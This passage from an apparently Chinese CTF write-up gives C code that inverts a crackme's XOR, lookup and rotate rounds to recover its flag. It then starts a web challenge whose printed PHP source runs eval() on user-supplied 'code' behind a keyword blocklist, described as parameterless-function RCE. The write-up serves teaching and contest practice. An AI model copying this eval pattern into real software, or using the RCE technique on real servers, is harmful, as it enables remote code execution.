        dword_40F020<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^=</span> dword_40F020<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;&gt;?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*7aaa29982a98eaab

xor pattern -&gt; [0x7c, 0xab, 0x2d, 0x91, 0x2f, 0x98, 0xed, 0xa9]
ans --&gt; [6,1,4,9,5,0,7,2]

*/</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br></div></div><h2 id="touch-of-satan"><a href="#touch-of-satan" class="header-anchor">#</a> Touch of Satan</h2> <p>c++的，挺花不过不太影响分析。4020DF函数初步检查输入格式flag{}和uuid中间的减号。然后回到main切掉前后大括号，然后401E16函数按照减号把uuid分割成五个部分。根据flaguuid部分的第一个字符，过一个巨大的switch，但是各个项目非常相似，干的事情主要是将uuid的不同部分重新排列顺序，不过包含相同部分的分支（比如0）提前就可以淘汰了，这一部分结束之后32字节的字符串被切成4字节长度的两大组每组四小组。然后算了代码段的一个散列值（感觉像CRC） 这个值和flag的处理结果被传给401AA3程序的主逻辑（对两大组分别执行一次），之后main将计算结果与8个没有其他访问的全局量比较，并给出正确和错误的结果。</p> <p>继续看401AA3的主要逻辑：到第三个new[]之前程序运算的东西都和输入没什么关系，所以暂且不看。然后flag的部分被传给一组变量，循环31轮，循环里三个函数，分别-&gt;将之前生成的表与flag异或，取flag特定位查表之后放到flag特定位，奇怪的异或和移位。循环之后继续执行两次异或和一次查表。三个函数的操作都是可逆的，写C来执行（为了避免踩坑，结果还是踩了好多坑）</p> <p>patch 校验和</p> <p><img src="/assets/img/2019-sh-3.aa1e6838.png" alt="3"></p> <p>动调 异或函数上下断点，获取异或表</p> <p><img src="/assets/img/2019-sh-4.ac171ef8.png" alt="4"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">rounds_xor</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>tab<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">refind_tab</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>tab<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">rolling</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>tab<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">!=</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment">//将查表部分的表反转</span>
            retab<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> i <span class="token operator">+</span> tabtab<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>
    <span class="token comment">//::AADBG</span>
    <span class="token comment">/*int v3=0;
    for(int i=0;i!=0x3D22;++i){
        v3 = (v3&gt;&gt;8)^dword_4053C0[0xFF&amp;(v3 ^ code[i])];
    }  printf(&quot;%x\n&quot;,~v3);*/</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> part <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> part <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">;</span> part<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">rounds_xor</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">refind_tab</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">rounds_xor</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> round <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span>round <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span>round<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">rolling</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">refind_tab</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">,</span>round<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">rounds_xor</span><span class="token punctuation">(</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">,</span>round<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">!=</span><span class="token number">16</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token function">putchar</span><span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;\t||\t%8x %8x %8x %8x \n&quot;</span><span class="token punctuation">,</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>out<span class="token punctuation">[</span>part<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token comment">/*
        rounds_xor(array, 32);
        refind_tab(array, 31);
        rounds_xor(array, 31);
        for(int round = 30;round &gt;= 0;round--){
            rolling(array);
            refind_tab(array,round);
            rounds_xor(array,round);
        }
    for(int j=0;j!=16;j++) putchar(j[(char*)array]);
    printf(&quot;\t||\t%8x %8x %8x %8x \n&quot;,array[0],array[1],array[2],array[3]);*/</span>
<span class="token punctuation">}</span>
<span class="token comment">/*34069f91 0x6ad0fc27
  *a1 = _rol4_(*a1, -13);
  a1[2] = _rol4_(a1[2], -3);
  a1[1] ^= *a1 ^ a1[2];
  a1[3] ^= a1[2] ^ 8 * *a1;
  a1[1] = _rol4_(a1[1], -1);
  a1[3] = _rol4_(a1[3], -7);
  *a1 ^= a1[3] ^ a1[1];
  a1[2] ^= a1[3] ^ (a1[1] &lt;&lt; 7);
  *a1 = _rol4_(*a1, -5);
  a1[2] = _rol4_(a1[2], -22);
*/</span>

<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">ror</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> uiNumber<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> iBits<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">register</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> _res<span class="token punctuation">;</span>
    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">&quot;ror %1, %%eax;&quot;</span>
            <span class="token operator">:</span> <span class="token string">&quot;=a&quot;</span><span class="token punctuation">(</span>_res<span class="token punctuation">)</span>
            <span class="token operator">:</span> <span class="token string">&quot;c&quot;</span><span class="token punctuation">(</span>iBits<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;0&quot;</span><span class="token punctuation">(</span>uiNumber<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> _res<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">rolling</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ror</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ror</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^=</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ror</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ror</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ror</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ror</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">rounds_xor</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>tab<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    tab<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^=</span> xor_tab<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    tab<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> xor_tab<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    tab<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^=</span> xor_tab<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    tab<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^=</span> xor_tab<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">refind_tab</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>tab<span class="token punctuation">,</span> <span class="token keyword">int</span> round<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span>i<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>retab<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span>round <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span>
                              <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tab<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">2</span>
                                                                                 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tab<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">*</span>tab <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>tab<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>v3 <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v3 <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v3 <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v3 <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  tab<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  tab<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  tab<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  tab<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br></div></div><p>跑出的结果，和所有可用的首字符值，逐个尝试之后发现9是可行解，还原出输入的flag
<img src="/assets/img/2019-sh-5.4db5406d.png" alt="5"></p> <h2 id="decade"><a href="#decade" class="header-anchor">#</a> decade</h2> <p>首先通过题目的F12发现在 <code>/code</code> 下是代码，查看发现是一个源码审计，而且是无参数函数的RCE，所以根据查阅原先的各种比赛的赛题。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'bye~'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;No way!!!&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;No way!!!&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
